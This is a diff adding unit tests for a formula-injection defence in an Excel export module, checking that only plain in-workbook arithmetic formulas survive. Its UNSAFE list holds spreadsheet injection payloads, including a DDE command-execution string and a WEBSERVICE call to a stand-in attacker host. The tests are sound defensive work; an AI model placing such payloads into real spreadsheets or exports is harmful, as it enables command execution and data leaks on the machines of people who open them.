@@ -98,3 +98,40 @@ class ExportSiteTests(TestCase):
         sl = ShortageList.objects.create(branch=self.branch, status='open', created_by=self.admin)
         ShortageItem.objects.create(shortage_list=sl, raw_name=EVIL)
         self.assertEqual(_formula_cells(export_list_excel(sl)), [])
+
+
+class KeepSafeFormulasTests(SimpleTestCase):
+    """Round 2, R5: the KPI board and the ISR fulfilment sheet build live formulas on purpose.
+    `neutralise_formulas(wb, keep_safe_formulas=True)` keeps a formula only when it is plain
+    in-workbook arithmetic; anything typed text could smuggle in is written as text."""
+
+    SAFE = ['=SUM(AC7:AH7)', '=$AC$7*$J9', '=IF(A1="x","y",MAX(ROUND(B2*3,1),1))',
+            "='Sheet 1'!A1+B2", "='بيانات الصنف'!C4*2", '=A:A', '=IF(TRUE,1,0)', '=-5',
+            '=MAX(0,ROUNDUP(B3*C4-D5,0))', '=COUNTIF(B8:B17,">0")']
+    UNSAFE = [EVIL, '=WEBSERVICE("http://evil.example")', "=cmd|'/c calc'!A0",
+              '=[1]Sheet1!A1', r"='C:\x\[book.xlsx]S'!A1", '=1+HYPERLINK("a")', '=secret_name',
+              '=@SUM(1)', '=IMPORTXML("u","q")', '=INDIRECT("A1")', '=CALL("k","f")', '=(']
+
+    def test_formula_classifier(self):
+        from core.export_safety import is_safe_formula
+        for f in self.SAFE:
+            self.assertTrue(is_safe_formula(f), f)
+        for f in self.UNSAFE:
+            self.assertFalse(is_safe_formula(f), f)
+
+    def test_keep_safe_keeps_code_formulas_and_neutralises_typed_text(self):
+        from core.export_safety import neutralise_formulas
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws['A1'], ws['A2'], ws['A3'] = '=SUM(B1:B5)', EVIL, '=cmd|\'/c calc\'!A0'
+        buf = io.BytesIO()
+        neutralise_formulas(wb, keep_safe_formulas=True).save(buf)
+        self.assertEqual(_formula_cells(buf.getvalue()), ['A1'])
+
+    def test_default_still_neutralises_everything(self):
+        from core.export_safety import neutralise_formulas
+        wb = openpyxl.Workbook()
+        wb.active['A1'] = '=SUM(B1:B5)'
+        buf = io.BytesIO()
+        neutralise_formulas(wb).save(buf)
+        self.assertEqual(_formula_cells(buf.getvalue()), [])
